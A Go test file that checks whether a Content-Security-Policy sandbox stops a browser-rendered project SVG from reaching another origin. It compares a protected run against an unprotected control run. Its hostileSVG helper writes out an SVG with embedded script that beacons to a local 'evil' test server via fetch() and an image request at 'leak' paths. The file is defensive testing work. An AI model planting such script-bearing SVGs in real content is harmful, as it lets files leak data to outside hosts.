//go:build !windows

package dashboard

import (
	"fmt"
	"net/http"
	"net/http/httptest"
	"sync/atomic"
	"testing"
	"time"
)

func TestANavigatedProjectSVGCannotPhoneHome(t *testing.T) {
	if testing.Short() {
		t.Skip("browser engines are not run in -short")
	}
	engines := resolveEngines()
	if len(engines) == 0 {
		t.Skip("no browser engine available")
	}
	for _, found := range engines {
		t.Run(found.engine.name, func(t *testing.T) {
			controlEvil, controlHits := evilOrigin(t)
			beacon := make(chan string, 1)
			var beaconAt atomic.Int64
			go func() {
				<-controlHits
				beaconAt.Store(time.Now().UnixNano())
				beacon <- "OK"
			}()
			var controlHad atomic.Int64
			began := time.Now()
			runServerInOneEngine(t, found.engine, found.path, svgServer(t, hostileSVG(controlEvil.URL), nil, &controlHad), beacon, 0, 0, 0)
			toPage := time.Unix(0, controlHad.Load()).Sub(began)
			toBeacon := time.Unix(0, beaconAt.Load()).Sub(time.Unix(0, controlHad.Load()))

			claimEvil, claimHits := evilOrigin(t)
			silence := max(3*time.Second, 3*toBeacon)
			window := 3*toPage + silence
			var claimHad atomic.Int64
			began = time.Now()
			runServerInOneEngine(t, found.engine, found.path, svgServer(t, hostileSVG(claimEvil.URL), map[string]string{
				"Content-Security-Policy": "default-src 'none'; sandbox",
				"X-Content-Type-Options":  "nosniff",
				"Content-Disposition":     "inline",
			}, &claimHad), make(chan string), 0, 0, window)
			ended := time.Now()
			if limit := began.Add(window); ended.After(limit) {
				ended = limit
			}
			claimEvil.Close() // what reached it has been answered, and is in its log
			select {
			case p := <-claimHits:
				t.Fatalf("a navigated project SVG reached another origin at %s — the CSP did not hold", p)
			default:
			}
			if claimHad.Load() == 0 {
				t.Fatalf("INCONCLUSIVE: the browser never had the SVG in its %v, so its silence proves nothing (the control had it after %v)", window.Round(time.Millisecond), toPage.Round(time.Millisecond))
			}
			silent := ended.Sub(time.Unix(0, claimHad.Load()))
			t.Logf("%s: the control had the page after %v and beaconed %v later; the claim had it after %v and was silent for %v after it (%v needed)",
				found.engine.name, toPage.Round(time.Millisecond), toBeacon.Round(time.Millisecond), time.Unix(0, claimHad.Load()).Sub(began).Round(time.Millisecond), silent.Round(time.Millisecond), silence.Round(time.Millisecond))
			if silent < silence {
				t.Fatalf("INCONCLUSIVE: the browser was silent for %v after it had the SVG; %v is needed, three times the control's %v from page to beacon", silent.Round(time.Millisecond), silence.Round(time.Millisecond), toBeacon.Round(time.Millisecond))
			}
		})
	}
}

func hostileSVG(evil string) string {
	return fmt.Sprintf(`<svg xmlns="http://www.w3.org/2000/svg" width="10" height="10">
  <script type="application/ecmascript"><![CDATA[
    try { fetch(%q, { mode: 'no-cors' }); } catch (e) {}
    try { new Image().src = %q; } catch (e) {}
  ]]></script>
  <rect width="10" height="10"/>
</svg>`, evil+"/leak-fetch", evil+"/leak-img")
}

func evilOrigin(t *testing.T) (*httptest.Server, <-chan string) {
	t.Helper()
	hits := make(chan string, 8)
	evil := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		select {
		case hits <- r.URL.Path:
		default:
		}
		w.WriteHeader(200)
	}))
	t.Cleanup(evil.Close)
	return evil, hits
}

func svgServer(t *testing.T, svg string, headers map[string]string, had *atomic.Int64) string {
	t.Helper()
	server := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		for k, v := range headers {
			w.Header().Set(k, v)
		}
		w.Header().Set("Content-Type", "image/svg+xml")
		fmt.Fprint(w, svg)
		if r.URL.Path == "/" {
			if f, ok := w.(http.Flusher); ok {
				f.Flush()
			}
			had.CompareAndSwap(0, time.Now().UnixNano())
		}
	}))
	t.Cleanup(server.Close)
	return server.URL
}
